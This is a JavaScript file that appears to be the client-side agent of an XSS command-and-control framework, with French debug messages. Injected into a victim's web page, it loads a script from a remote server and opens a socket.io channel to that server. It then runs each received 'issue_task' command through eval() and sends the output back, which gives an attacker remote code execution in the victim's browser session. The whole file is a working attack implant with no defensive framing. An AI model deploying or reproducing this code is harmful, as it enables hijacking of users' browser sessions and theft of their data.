console.log("ici");
var scriptsrc = document.getElementById("kitty").getAttribute("src");
var c2server = scriptsrc.substring(0, scriptsrc.length - 11);
console.log(c2server);
var mysocket;
var uuid;

var remoteAddress = document.location.hostname;
var remotePort = document.location.port;
(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) {
        return;
    }
    js = d.createElement(s);
    js.id = id;
    js.onload = function() {
        $(document).ready(function() {
            mysocket = io.connect(`http://${remoteAddress}:${remotePort}/remote`);
            mysocket.on('connect', function(){
                console.log("connect");
            });
            mysocket.on('connect_error', function(error)
            {
                console.log("connect_error");
                console.log(error);
            });

            function sendOutput(taskid, message, listener='send_data', type='cmd') {
                let output;
                if (typeof message === 'object') {
                    output = JSON.stringify(message);
                } else if (typeof message === 'string') {
                    output = message;
                } else {
                    output = String(message);
                }
                console.log("output:" +output);
                if (type=='cmd')
                {
                    mysocket.emit(listener, {
                        id: taskid,
                        output: output
                    });
                    return false;				
                }
                else{
                    mysocket.emit(listener, {
                        id: taskid,
                        output: output
                    });
                    return false;
                }
            };
            mysocket.on('issue_task', function(msg) {
                console.log(msg);
                console.log("Commande recue");
                id = msg['task_id'];
                console.log(msg['input']);
                try {
                    var cmdout = eval(String(msg['input'])); //do the task
                    if (String(msg['input']).includes('sendOutput') == false) {
                        sendOutput(id, cmdout, type=msg['type']);
                    }
                } catch (err) {
                    sendOutput(id, err, type=msg['type']);
                }
            });
            mysocket.on('test', function(msg){
                console.log("dans test");
                console.log(msg);
            });
            mysocket
        });
};
js.src = `http://${remoteAddress}:${remotePort}/static/includes.js`;
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'xss-includes'));
